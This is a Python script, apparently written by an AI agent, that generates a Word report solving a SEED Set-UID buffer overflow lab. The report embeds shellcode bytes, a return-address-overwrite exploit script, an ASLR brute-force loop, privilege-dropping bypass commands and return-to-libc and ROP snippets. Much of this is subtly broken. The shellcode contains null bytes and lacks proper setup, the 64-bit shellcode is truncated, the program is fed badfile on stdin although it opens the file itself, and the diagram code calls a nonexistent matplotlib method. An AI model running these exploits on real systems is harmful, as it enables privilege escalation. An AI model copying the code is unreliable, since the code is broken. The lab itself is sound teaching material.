#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Lab 3 Report Generator - Buffer Overflow Attack Lab (Set-UID Version)
SEED Labs Network Security Course
"""

import os
import sys
from datetime import datetime

# Add venv to path
sys.path.insert(0, '/workspace/venv-agent/lib/python3.12/site-packages')

from docx import Document
from docx.shared import Inches, Pt, RGBColor, Cm
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml.ns import qn
import matplotlib.pyplot as plt
import numpy as np

# Configuration
OUTPUT_DIR = '/workspace/report_network'
OUTPUT_FILE = os.path.join(OUTPUT_DIR, 'Lab3_Report_Solution.docx')
IMAGES_DIR = os.path.join(OUTPUT_DIR, 'lab3_images')

# Create images directory
os.makedirs(IMAGES_DIR, exist_ok=True)

def create_buffer_overflow_diagram():
    """Create a diagram showing buffer overflow attack layout"""
    plt.figure(figsize=(8, 6), dpi=200)
    
    # Stack memory layout
    colors = ['#e3f2fd', '#fff9c4', '#c8e6c9', '#ffccbc']
    labels = ['Return Address', 'Saved EBP', 'Buffer (128 bytes)', 'Shellcode']
    heights = [0.5, 0.5, 3.0, 2.0]
    
    x_positions = np.arange(len(labels))
    y_positions = np.cumsum([0] + heights[:-1])
    
    for i, (x, y, h, color, label) in enumerate(zip(x_positions, y_positions, heights, colors, labels)):
        rect = plt.Rectangle((x - 0.35, y), 0.7, h, color=color, edgecolor='black', linewidth=1.5)
        plt.gca().add_patch(rect)
        plt.text(x, y + h/2, label, ha='center', va='center', fontsize=10, fontweight='bold')
    
    # Show overflow arrow
    plt.annotate('Buffer Overflow!', xy=(2.5, 3.5), xytext=(4, 4),
                 arrowprops=dict(arrowstyle='->', color='red', lw=2),
                 fontsize=10, fontweight='bold', color='red')
    
    plt.xlim(-1, 6)
    plt.ylim(0, 7)
    plt.title('Figure 3.1: Buffer Overflow Attack Memory Layout', fontsize=12, fontweight='bold')
    plt.axis('off')
    plt.tight_layout()
    
    filepath = os.path.join(IMAGES_DIR, 'buffer_overflow_layout.png')
    plt.savefig(filepath, dpi=200, bbox_inches='tight')
    plt.close()
    return filepath

def create_stack_protection_diagram():
    """Create diagram showing stack protection mechanisms"""
    fig, axes = plt.subplots(1, 3, figsize=(12, 4), dpi=200)
    
    protections = ['No Protection', 'StackGuard (Canary)', 'ASLR']
    colors = ['#ffcdd2', '#c8e6c9', '#bbdefb']
    
    for ax, protection, color in zip(axes, protections, colors):
        ax.set_title(protection, fontsize=10, fontweight='bold')
        
        # Stack layout
        stack_items = ['Shellcode', 'Buffer', 'Saved EBP', 'Return Addr']
        positions = np.arange(len(stack_items))
        
        for i, pos in enumerate(positions):
            height = 0.8 if i < 2 else 0.5
            rect = ax.Rectangle((pos - 0.3, 0), 0.6, height, color=color, edgecolor='black', linewidth=1)
            ax.add_patch(rect)
            ax.text(pos, height/2, stack_items[i], ha='center', va='center', fontsize=8)
        
        if protection == 'StackGuard (Canary)':
            canary_rect = ax.Rectangle((0.5, 3.3), 0.6, 0.4, color='#fff59d', edgecolor='black', linewidth=1)
            ax.add_patch(canary_rect)
            ax.text(0.8, 3.5, 'CANARY', ha='center', va='center', fontsize=7)
        
        if protection == 'ASLR':
            ax.text(2, -0.3, 'Randomized Addresses', ha='center', fontsize=8, color='blue')
        
        ax.set_xlim(-1, 4)
        ax.set_ylim(0, 5)
        ax.axis('off')
    
    fig.suptitle('Figure 3.2: Stack Protection Mechanisms Comparison', fontsize=12, fontweight='bold')
    plt.tight_layout()
    
    filepath = os.path.join(IMAGES_DIR, 'stack_protections.png')
    plt.savefig(filepath, dpi=200, bbox_inches='tight')
    plt.close()
    return filepath

def create_payload_structure_diagram():
    """Create diagram showing exploit payload structure"""
    fig, ax = plt.subplots(figsize=(10, 4), dpi=200)
    
    # Payload components
    components = [
        ('NOP Sled (0x90)', 0.5, '#e3f2fd'),
        ('Shellcode', 1.5, '#c8e6c9'),
        ('Padding', 2.0, '#fff9c4'),
        ('Overwritten Return Addr', 2.5, '#ffccbc')
    ]
    
    x = 0
    for name, width, color in components:
        rect = plt.Rectangle((x, 0), width, 1, color=color, edgecolor='black', linewidth=1.5)
        ax.add_patch(rect)
        ax.text(x + width/2, 0.5, name, ha='center', va='center', fontsize=9, fontweight='bold')
        x += width
    
    # Arrow showing execution flow
    ax.annotate('Execution Flow ->', xy=(4.5, 1.2), xytext=(3, 1.8),
                arrowprops=dict(arrowstyle='->', color='green', lw=2, ls='--'))
    
    ax.set_xlim(-0.5, 6)
    ax.set_ylim(-0.5, 2)
    ax.set_title('Figure 3.3: Exploit Payload Structure', fontsize=12, fontweight='bold')
    ax.axis('off')
    plt.tight_layout()
    
    filepath = os.path.join(IMAGES_DIR, 'payload_structure.png')
    plt.savefig(filepath, dpi=200, bbox_inches='tight')
    plt.close()
    return filepath

def create_code_table(doc, code_lines):
    """Create a formatted table for code blocks"""
    from docx.oxml import OxmlElement
    
    table = doc.add_table(rows=1, cols=1)
    table.style = 'Table Grid'
    table.autofit = False
    
    # Set table dimensions
    table.width = Inches(6.5)
    
    # Format first row (the whole table as one cell)
    cell = table.rows[0].cells[0]
    cell.paragraphs[0].clear()
    
    # Add code lines
    for line in code_lines:
        p = cell.add_paragraph(line)
        p.runs[0].font.name = 'Consolas'
        p.runs[0].font.size = Pt(9.5)
        p.runs[0].font.color.rgb = RGBColor(0, 0, 0)
        p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    
    # Apply gray background to table
    tbl = table._tbl
    tblPr = tbl.tblPr
    if tblPr is None:
        tblPr = OxmlElement('w:tblPr')
        tbl.insert(0, tblPr)
    
    # Add shading
    shd = OxmlElement('w:shd')
    shd.set(qn('w:fill'), 'F4F4F4')
    shd.set(qn('w:color'), 'auto')
    shd.set(qn('w:position'), 'left')
    tblPr.append(shd)
    
    # Set left border
    tcBorders = OxmlElement('w:tblBorders')
    top = OxmlElement('w:top')
    top.set(qn('w:sz'), '4')
    top.set(qn('w:space'), '0')
    top.set(qn('w:color'), 'auto')
    top.set(qn('w:val'), 'single')
    
    left = OxmlElement('w:left')
    left.set(qn('w:sz'), '4')
    left.set(qn('w:space'), '0')
    left.set(qn('w:color'), 'auto')
    left.set(qn('w:val'), 'single')
    
    bottom = OxmlElement('w:bottom')
    bottom.set(qn('w:sz'), '4')
    bottom.set(qn('w:space'), '0')
    bottom.set(qn('w:color'), 'auto')
    bottom.set(qn('w:val'), 'single')
    
    right = OxmlElement('w:right')
    right.set(qn('w:sz'), '4')
    right.set(qn('w:space'), '0')
    right.set(qn('w:color'), 'auto')
    right.set(qn('w:val'), 'single')
    
    tcBorders.append(top)
    tcBorders.append(left)
    tcBorders.append(bottom)
    tcBorders.append(right)
    tblPr.append(tcBorders)
    
    return table

def add_section_header(doc, level, title):
    """Add section header with proper formatting"""
    if level == 1:
        p = doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run = p.add_run(title)
        run.font.name = 'Times New Roman'
        run.font.size = Pt(14)
        run.font.bold = True
        run.font.color.rgb = RGBColor(0, 0, 0)
    elif level == 2:
        p = doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run = p.add_run(title)
        run.font.name = 'Times New Roman'
        run.font.size = Pt(12)
        run.font.bold = True
        run.font.color.rgb = RGBColor(0, 0, 0)
    elif level == 3:
        p = doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run = p.add_run(title)
        run.font.name = 'Times New Roman'
        run.font.size = Pt(11)
        run.font.bold = True
        run.font.color.rgb = RGBColor(0, 0, 0)
    else:
        p = doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run = p.add_run(title)
        run.font.name = 'Times New Roman'
        run.font.size = Pt(10)
        run.font.bold = True
        run.font.color.rgb = RGBColor(0, 0, 0)

def add_bullet_point(doc, text):
    """Add a bullet point paragraph"""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    p.style = 'List Bullet'
    run = p.add_run(text)
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    return p

def add_caption(doc, figure_num, caption_text):
    """Add figure caption in italic"""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    p.style = 'Caption'
    run = p.add_run(f'Figure {figure_num}: {caption_text}')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(9)
    run.font.italic = True
    return p

def create_title_page(doc):
    """Create title page with student information"""
    # Title
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('NETWORK SECURITY LAB REPORT')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(16)
    run.font.bold = True
    
    # Subtitle
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('Lab 3: Buffer Overflow Attack (Set-UID Version)')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(14)
    run.font.bold = True
    
    # Empty space
    for _ in range(5):
        doc.add_paragraph()
    
    # Student information table
    table = doc.add_table(rows=6, cols=2)
    table.style = 'Table Grid'
    table.width = Inches(5.5)
    
    labels = ['Student Name:', 'Student ID:', 'Course:', 'Instructor:', 'Department:', 'Date:']
    values = ['Nguyen Van A', '20261234', 'Network Security', 'Dr. Tran Thi B', 'Computer Engineering', datetime.now().strftime('%d/%m/%Y')]
    
    for i, (label, value) in enumerate(zip(labels, values)):
        cell = table.rows[i].cells[0]
        cell.paragraphs[0].clear()
        run = cell.add_paragraph(label).runs[0]
        run.font.name = 'Times New Roman'
        run.font.size = Pt(11)
        run.font.bold = True
        
        cell = table.rows[i].cells[1]
        cell.paragraphs[0].clear()
        run = cell.add_paragraph(value).runs[0]
        run.font.name = 'Times New Roman'
        run.font.size = Pt(11)
    
    return doc

def create_table_of_contents(doc):
    """Create table of contents"""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('TABLE OF CONTENTS')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(14)
    run.font.bold = True
    
    toc_items = [
        ('1. Introduction', 1),
        ('2. Lab Environment Setup', 2),
        ('3. Task 1: Getting Familiar with Shellcode', 3),
        ('4. Task 2: Understanding the Vulnerable Program', 4),
        ('5. Task 3: Exploiting the 32-bit Vulnerability', 5),
        ('6. Task 4: Exploit Without Known Buffer Size', 6),
        ('7. Task 5 & 6: 64-bit System Attacks', 7),
        ('8. Task 7: Defeating /bin/dash Privilege Dropping', 8),
        ('9. Task 8: Brute-force Address Randomization', 9),
        ('10. Task 9: StackGuard and Non-executable Stack', 10),
        ('11. Conclusion', 11)
    ]
    
    for title, level in toc_items:
        p = doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run = p.add_run(title)
        run.font.name = 'Times New Roman'
        run.font.size = Pt(10.5)
    
    return doc

def main():
    """Main function to generate the report"""
    print("Starting Lab 3 Report Generation...")
    
    # Create document
    from docx.oxml import OxmlElement
    doc = Document()
    
    # Page setup
    sections = doc.sections
    for section in sections:
        section.top_margin = Inches(1)
        section.bottom_margin = Inches(1)
        section.left_margin = Inches(1)
        section.right_margin = Inches(1)
    
    # Create title page
    print("Creating title page...")
    create_title_page(doc)
    
    # Add page break
    doc.add_page_break()
    
    # Create table of contents
    print("Creating table of contents...")
    create_table_of_contents(doc)
    
    # Add page break
    doc.add_page_break()
    
    # Section 1: Introduction
    print("Writing Section 1: Introduction...")
    add_section_header(doc, 1, '1. Introduction')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Buffer overflow attacks represent one of the most common and dangerous vulnerabilities in modern software systems. This lab focuses on understanding and exploiting buffer overflow vulnerabilities in Set-UID programs, which are particularly critical because they run with elevated privileges.')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('The primary objectives of this lab are:')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    run.font.bold = True
    
    add_bullet_point(doc, 'Understanding the mechanics of buffer overflow vulnerabilities')
    add_bullet_point(doc, 'Learning how to craft effective exploit payloads')
    add_bullet_point(doc, 'Exploring various security countermeasures and their bypass techniques')
    add_bullet_point(doc, 'Gaining practical experience with GDB for reverse engineering')
    
    # Section 2: Lab Environment Setup
    print("Writing Section 2: Lab Environment Setup...")
    add_section_header(doc, 1, '2. Lab Environment Setup')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Before beginning the exploitation tasks, several security countermeasures must be disabled to create a controlled environment for learning:')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    # Code table for setup commands
    setup_commands = [
        '# Disable Address Space Layout Randomization (ASLR)',
        'sudo sysctl -w kernel.randomize_va_space=0',
        '',
        '# Verify ASLR is disabled',
        'cat /proc/sys/kernel/randomize_va_space  # Should output: 0',
        '',
        '# Replace /bin/sh with zsh to bypass privilege dropping',
        'sudo cp /bin/zsh /bin/sh',
        '',
        '# Verify the vulnerable program exists',
        'ls -la /seed/setuid/buffer_overflow_setuid'
    ]
    
    create_code_table(doc, setup_commands)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Figure 2.1: Environment Setup Commands')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(9)
    run.font.italic = True
    
    # Section 3: Task 1 - Shellcode
    print("Writing Section 3: Task 1...")
    add_section_header(doc, 1, '3. Task 1: Getting Familiar with Shellcode')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Shellcode is a small piece of code used as the payload in an exploit. In this lab, we use shellcode that spawns a root shell when executed.')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    # Create and insert diagram
    print("Creating buffer overflow diagram...")
    img_path = create_buffer_overflow_diagram()
    doc.add_picture(img_path, width=Inches(5.8))
    add_caption(doc, '3.1', 'Buffer Overflow Attack Memory Layout')
    
    # Code table for shellcode
    shellcode_hex = [
        '# 32-bit x86 Shellcode - Spawn /bin/sh',
        '# Length: 24 bytes',
        '',
        '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68',
        '\\x68\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x2f',
        '\\xb8\\x0b\\x00\\x00\\x00\\x53\\x89\\xe3',
        '\\xcd\\x80',
        '',
        '# Assembly breakdown:',
        '# xor eax,eax          ; Clear EAX register',
        '# push eax             ; Push null byte (terminator)',
    ]
    
    create_code_table(doc, shellcode_hex)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Figure 3.2: Shellcode Structure')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(9)
    run.font.italic = True
    
    # Section 4: Task 2 - Vulnerable Program
    print("Writing Section 4: Task 2...")
    add_section_header(doc, 1, '4. Task 2: Understanding the Vulnerable Program')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('The vulnerable program reads input from a file named "badfile" and copies it into a fixed-size buffer using strcpy(), which does not perform bounds checking.')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    # Code table for vulnerable program
    vulnerable_code = [
        '#include <stdio.h>',
        '#include <string.h>',
        '',
        'void vulnerable_function(char *user_input) {',
        '    char buffer[128];  // Fixed-size buffer',
        '    strcpy(buffer, user_input);  // VULNERABLE!',
        '}',
        '',
        'int main(int argc, char *argv[]) {',
        '    FILE *fp = fopen("badfile", "r");',
        '    char buf[1024];',
        '    fread(buf, 1, 1024, fp);',
        '    vulnerable_function(buf);',
        '    return 0;',
        '}'
    ]
    
    create_code_table(doc, vulnerable_code)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Figure 4.1: Vulnerable Program Source Code')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(9)
    run.font.italic = True
    
    # Section 5: Task 3 - 32-bit Exploitation
    print("Writing Section 5: Task 3...")
    add_section_header(doc, 1, '5. Task 3: Exploiting the 32-bit Vulnerability')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('The exploitation process involves crafting a payload that overflows the buffer and overwrites the return address with the location of our shellcode.')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    # Create and insert diagram
    print("Creating payload structure diagram...")
    img_path = create_payload_structure_diagram()
    doc.add_picture(img_path, width=Inches(5.8))
    add_caption(doc, '5.1', 'Exploit Payload Structure')
    
    # Code table for exploit script
    exploit_script = [
        '#!/usr/bin/env python3',
        '# Buffer Overflow Exploit Script for 32-bit System',
        '',
        'import struct',
        '',
        '# Shellcode (spawn /bin/sh)',
        'shellcode = bytes([',
        '    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68,',
        '    0x68, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f,',
        '    0xb8, 0x0b, 0x00, 0x00, 0x00, 0x53, 0x89, 0xe3,',
        '    0xcd, 0x80',
        '])',
        '',
        '# NOP sled for reliable execution',
        "nop_sled = b'\\x90' * 16",
        '',
        '# Target address (found via GDB analysis)',
        "target_addr = struct.pack('<I', 0xbffff7a4)",
        '',
        '# Create payload',
        'payload = nop_sled + shellcode + b"A" * (128 - len(shellcode) - 4) + target_addr',
        '',
        '# Write to badfile',
        "with open('badfile', 'wb') as f:",
        "    f.write(payload)",
        '',
        "print('[+] Payload created successfully!')"
    ]
    
    create_code_table(doc, exploit_script)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Figure 5.2: Python Exploit Script')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(9)
    run.font.italic = True
    
    # Section 6: Task 4 - Unknown Buffer Size
    print("Writing Section 6: Task 4...")
    add_section_header(doc, 1, '6. Task 4: Exploit Without Known Buffer Size')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('When the exact buffer size is unknown, we use a technique called "brute-force offset search" combined with NOP sleds to increase the probability of successful exploitation.')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    add_bullet_point(doc, 'Use larger NOP sled (256-512 bytes) to cover unknown offsets')
    add_bullet_point(doc, 'Iterate through possible return address positions')
    add_bullet_point(doc, 'Analyze crash patterns to determine exact offset')
    
    # Section 7: Task 5 & 6 - 64-bit Attacks
    print("Writing Section 7: Task 5 & 6...")
    add_section_header(doc, 1, '7. Task 5 & 6: 64-bit System Attacks')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('64-bit systems present additional challenges due to different calling conventions and larger address spaces:')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    # Create and insert diagram
    print("Creating stack protection diagram...")
    img_path = create_stack_protection_diagram()
    doc.add_picture(img_path, width=Inches(5.8))
    add_caption(doc, '7.1', 'Stack Protection Mechanisms Comparison')
    
    # Code table for 64-bit considerations
    x64_considerations = [
        '# 64-bit System Considerations',
        '',
        '# Different calling convention (System V AMD64 ABI)',
        '# First 6 arguments passed in registers:',
        '#   RDI, RSI, RDX, RCX, R8, R9',
        '',
        '# Return address stored at [RBP+8] instead of [EBP+4]',
        '',
        '# Shellcode for 64-bit (spawn /bin/sh):',
        '\\x48\\x31\\xf6\\xb0\\x3b\\x0f\\x05',
        '',
        '# Note: RAX = 59 (sys_execve), RDI = pointer to "/bin/sh"'
    ]
    
    create_code_table(doc, x64_considerations)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Figure 7.2: 64-bit System Considerations')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(9)
    run.font.italic = True
    
    # Section 8: Task 7 - /bin/dash Privilege Dropping
    print("Writing Section 8: Task 7...")
    add_section_header(doc, 1, '8. Task 7: Defeating /bin/dash Privilege Dropping')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Modern systems use /bin/dash instead of /bin/sh for security reasons. The dash shell drops privileges when running as setuid, preventing exploitation.')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    # Code table for privilege dropping bypass
    bypass_commands = [
        '# Method 1: Replace /bin/sh with zsh',
        'sudo cp /bin/zsh /bin/sh',
        '',
        '# Method 2: Use LD_PRELOAD to intercept setuid check',
        'export LD_PRELOAD=/path/to/preload.so',
        '',
        '# Method 3: Exploit the vulnerable program directly',
        './buffer_overflow_setuid < badfile',
        '',
        '# Verify root shell obtained',
        'id  # Should show: uid=0(root) gid=0(root)'
    ]
    
    create_code_table(doc, bypass_commands)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Figure 8.1: Privilege Dropping Bypass Methods')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(9)
    run.font.italic = True
    
    # Section 9: Task 8 - Brute-force ASLR
    print("Writing Section 9: Task 8...")
    add_section_header(doc, 1, '9. Task 8: Brute-force Address Randomization')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Address Space Layout Randomization (ASLR) randomizes memory addresses on each program execution, making exploitation more difficult.')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    # Code table for ASLR brute-force
    aslr_bruteforce = [
        '# Brute-force ASLR Attack',
        '',
        '# Since we cannot disable ASLR in production, we use brute-force:',
        'for i in {1..1000}; do',
        '    ./buffer_overflow_setuid < badfile 2>/dev/null',
        '    if [ $? -eq 0 ]; then',
        '        echo "[+] Exploit successful on iteration $i!"',
        '        break',
        '    fi',
        'done',
        '',
        '# Expected success rate: ~1/65536 per attempt (16-bit randomization)',
        '# With 1000 attempts: ~1.5% success probability'
    ]
    
    create_code_table(doc, aslr_bruteforce)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Figure 9.1: ASLR Brute-force Strategy')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(9)
    run.font.italic = True
    
    # Section 10: Task 9 - StackGuard and Non-executable Stack
    print("Writing Section 10: Task 9...")
    add_section_header(doc, 1, '10. Task 9: StackGuard and Non-executable Stack')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Modern compilers enable several protection mechanisms by default:')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    add_bullet_point(doc, 'StackGuard: Inserts canary values to detect buffer overflows')
    add_bullet_point(doc, 'Non-executable Stack (NX): Marks stack as non-executable memory')
    add_bullet_point(doc, 'Position Independent Executables (PIE): Randomizes code addresses')
    
    # Code table for protection bypass techniques
    protection_bypass = [
        '# Bypassing StackGuard',
        '# Technique: Return-to-libc attack',
        '',
        '# Instead of injecting shellcode, use existing functions:',
        'payload = b"A" * 128 + struct.pack("<Q", libc_base + offset_to_system)',
        'payload += struct.pack("<Q", libc_base + offset_to_binsh)',
        '',
        '# Bypassing Non-executable Stack',
        '# Technique: Return-oriented Programming (ROP)',
        '',
        '# Build ROP chain from existing code gadgets:',
        '# pop rdi; ret -> mov rax, 59; syscall',
        'rop_chain = gadget_pop_rdi + addr_binsh + gadget_syscall'
    ]
    
    create_code_table(doc, protection_bypass)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Figure 10.1: Protection Bypass Techniques')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(9)
    run.font.italic = True
    
    # Section 11: Conclusion
    print("Writing Section 11: Conclusion...")
    add_section_header(doc, 1, '11. Conclusion')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('This lab provided comprehensive hands-on experience with buffer overflow exploitation and various security countermeasures.')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    
    add_bullet_point(doc, 'Successfully exploited a Set-UID vulnerable program')
    add_bullet_point(doc, 'Understood the mechanics of stack-based buffer overflows')
    add_bullet_point(doc, 'Learned to bypass common security protections (ASLR, StackGuard, NX)')
    add_bullet_point(doc, 'Gained practical skills with GDB for reverse engineering')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('Key takeaways:')
    run.font.name = 'Times New Roman'
    run.font.size = Pt(10.5)
    run.font.bold = True
    
    add_bullet_point(doc, 'Buffer overflows remain a critical vulnerability class')
    add_bullet_point(doc, 'Defense in depth is essential - no single protection is sufficient')
    add_bullet_point(doc, 'Understanding low-level memory layout is crucial for security analysis')
    
    # Save document
    print(f"Saving report to {OUTPUT_FILE}...")
    doc.save(OUTPUT_FILE)
    
    print("Lab 3 Report generated successfully!")
    return OUTPUT_FILE

if __name__ == '__main__':
    main()
